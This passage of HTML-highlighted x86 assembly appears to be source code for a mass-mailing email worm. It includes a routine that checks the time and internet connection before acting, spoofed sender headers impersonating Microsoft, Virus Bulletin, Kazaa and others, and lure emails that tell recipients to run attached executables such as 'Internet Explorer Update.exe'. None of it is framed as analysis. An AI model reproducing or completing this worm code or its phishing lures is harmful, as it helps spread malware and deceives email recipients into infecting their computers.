    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">BadMail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastMailPointer</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;restore mail pointer,if we</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NotMail</span><span class="sc0">                 </span><span class="sc1">;copy invalid mail</span><span class="sc0">
    
    
    
    </span><span class="sc5">_FSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">LastMailPointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">NewMail</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

    
</span><span class="sc5">SYSTEMTIME</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">wYear</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMonth</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wDayOfWeek</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wDay</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wHour</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMinute</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wSecond</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wMilliseconds</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   
    
    
</span><span class="sc5">CheckConditions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;check time &amp; internet connection</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get system time</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wMinute</span><span class="sc4">],</span><span class="sc2">2dh</span><span class="sc0">    </span><span class="sc1">;minute most be &gt; 45</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">BadConditions</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">19h</span><span class="sc0">   </span><span class="sc1">;day most be &lt; 25</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">BadConditions</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wSecond</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">    </span><span class="sc1">;second most be &gt; 30</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">BadConditions</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinInetDll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">BadConditions</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_InternetCheckConnection</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">BadConditions</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FLAG_ICC_FORCE_CONNECTION</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SiteToCheck</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">              </span><span class="sc1">;there is internet connection ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">BadConditions</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">BadConditions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
    </span><span class="sc5">WinInetDll</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Wininet.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_InternetCheckConnection</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"InternetCheckConnectionA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FLAG_ICC_FORCE_CONNECTION</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc5">SiteToCheck</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"http://www.google.com/"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    


</span><span class="sc5">FromAndSubject1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;from and subject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"From:Microsoft Security Alert &lt;SecurityUpdate@Microsoft.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Subject:Microsoft Security Update"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfFromAndSubject1</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">FromAndSubject1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FromAndSubject2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;from and subject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"From:WorldSex.com &lt;Pictures@WorldSex.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Subject:Your Dayly Pictures"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfFromAndSubject2</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">FromAndSubject2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FromAndSubject3</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;from and subject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"From:Virus Bulletin &lt;Support@Virusbtn.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Subject:A New Tool From Virus Bulletin"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfFromAndSubject3</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">FromAndSubject3</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FromAndSubject4</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;from and subject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"From:Kazaa.com &lt;Support@Kazaa.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Subject:Get YourSelf Kazaa Media Desktop !!!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfFromAndSubject4</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">FromAndSubject4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FromAndSubject5</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;from and subject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"From:Greeting-Card.com &lt;FreeGreeting@Greeting-Cards.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Subject:You've got an e-card at greeting-cards.com"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfFromAndSubject5</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">FromAndSubject5</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">MessageMimeHeader</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MIME-Version: 1.0"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: multipart/mixed;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' boundary="bound1"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"X-Priority: 3"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"X-MSMail-Priority: Normal"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"X-Mailer: Microsoft Outlook Express 6.00.2800.1106"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"This is a multi-part message in MIME format."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--bound1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: text/plain;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' charset="windows-1255"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Transfer-Encoding: 7bit"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfMessageMimeHeader</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageMimeHeader</span><span class="sc4">)</span><span class="sc0">
    
    
    
    </span><span class="sc1">;message and filename</span><span class="sc0">
</span><span class="sc5">MessageAndFileName1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Dear Microsoft Customer"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"A new vulnerability has been discovered in Internet Explorer"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"we recommending you to update internet explorer as soon as"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"possible, this vulnerablility is critical and may allow"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"execution of malicious code on your system while you use internet"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"explorer."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"vulnerable versions:"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Internet Explorer 5.0"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Internet Explorer 6.0"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"if you using one of this versions please install attached update."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Thank You."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"The Microsoft Security Team."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"If you do not wish to receive future Security Update E-mail from"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Microsoft, or believe you were subscribed in error, please send"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"a blank E-mail to SecurityUpdate@microsoft.com"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--bound1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: application/octet-stream;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' name= "Internet Explorer Update.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Transfer-Encoding: base64"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Disposition: attachment;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'   filename= "Internet Explorer Update.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

    </span><span class="sc5">SizeOfMessageAndFileName1</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageAndFileName1</span><span class="sc4">)</span><span class="sc0"> 
    
    
</span><span class="sc5">MessageAndFileName2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"150 XXX Pictures For You !!!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"here are your dayly xxx pictures."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Have Fun &amp; Enjoy..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"we like to inform you that your account at"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">    </span><span class="sc1">;try to make this letter formal :)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"our web site will be expired at the end of"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"this month,please renew your account"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"renew of account for old members is only 25$"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"per half year."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Please Visit Our Web Site:"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"http://www.WorldSex.com/"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--bound1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: application/octet-stream;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' name= "150_XXX_Pictures.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Transfer-Encoding: base64"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Disposition: attachment;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'   filename= "150_XXX_Pictures.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

    </span><span class="sc5">SizeOfMessageAndFileName2</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageAndFileName2</span><span class="sc4">)</span><span class="sc0"> 
        
    
</span><span class="sc5">MessageAndFileName3</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Dear Symantec/F-Secure/Mcafee/Trend Micro User"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"We Have Developed A New Tool That Can Block New"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Internet Worms From Attacking Your Computer,We"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Recommending To Install This Tool Before A New"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Internet Worm Will Start To Spread"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"How To Use The Tool:"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Just Run The Attached File,After You Have Run It"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Follow The Instructions."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Thank You."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"The Virus Bulletin Security Team."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"For More Information Please Visit Our Web Site:"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"       http://www.virusbtn.com/"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"If you do not wish to receive future antivirus tools from"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Virus Bulletin, or believe you were subscribed in error, "</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"please send,a blank E-mail to Subscribe@Virusbtn.com"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
